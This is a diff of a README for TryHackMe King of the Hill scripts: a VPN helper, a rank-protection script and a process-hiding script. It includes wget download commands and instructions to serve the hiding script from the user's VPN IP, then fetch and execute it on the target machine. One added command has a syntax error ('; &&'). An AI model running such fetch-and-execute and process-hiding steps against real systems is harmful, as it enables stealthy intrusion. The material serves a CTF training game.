@@ -7,12 +7,6 @@
 
 ---
 
-```shell
-wget https://raw.githubusercontent.com/Anlominus/TryHackMe/main/King%20of%20the%20Hill/KoTH/KoTH ; sh KoTH
-```
-```shell
-wget https://github.com/Anlominus/TryHackMe/blob/main/King%20of%20the%20Hill/KoTH/KoTH-Protection ; sh KoTH-Protection
-```
 
 </div>
 
@@ -20,15 +14,30 @@ wget https://github.com/Anlominus/TryHackMe/blob/main/King%20of%20the%20Hill/KoT
 
 # 📜 KoTH Menu ~ To Do
 - 📜 Menu
-  - [ ] 1️⃣ ~ [`KoTH`](./KoTH) ~> TryHackMe VPN
-      > Simple helper script for VPN, VM's, etc
-  - [ ] 2️⃣ ~ [`KoTH-Protection`](./KoTH-Protection) ~> Protecting Rank in King of The Hill
-      > A script to protect your king
-  - [ ] 3️⃣ ~ [`KoTh-Hidding`](./KoTh-Hidding) ~> A simple script to hide a process with mount
-      > ## Start local server
-      > `python3 -m http.server 80`
-      > ## in the Target Machine
-      > `wget http://yourvpnip/KoTh-Hidding && chmod +x KoTh-Hidding && ./KoTh-Hidding`
+### 1️⃣ ~ [`KoTH`](./KoTH) ~> TryHackMe VPN
+> Simple helper script for VPN, VM's, etc
+```shell
+wget https://raw.githubusercontent.com/Anlominus/TryHackMe/main/King%20of%20the%20Hill/KoTH/KoTH ; chmod +x KoTH
+```
+
+---
+
+### 2️⃣ ~ [`KoTH-Protection`](./KoTH-Protection) ~> Protecting Rank in King of The Hill
+> A script to protect your king
+```shell
+wget https://github.com/Anlominus/TryHackMe/blob/main/King%20of%20the%20Hill/KoTH/KoTH-Protection ; chmod +x KoTH-Protection
+```
+
+---
+
+### 3️⃣ ~ [`KoTh-Hidding`](./KoTh-Hidding) ~> A simple script to hide a process with mount
+```shell
+wget https://github.com/Anlominus/TryHackMe/blob/main/King%20of%20the%20Hill/KoTH/KoTh-Hidding; && chmod +x KoTh-Hidding
+```
+> - Start local server <br>
+>   - `python3 -m http.server 80` <br>
+> - in the Target Machine <br>
+>   - `wget http://yourvpnip/KoTh-Hidding && chmod +x KoTh-Hidding && ./KoTh-Hidding`
 
 
 ---
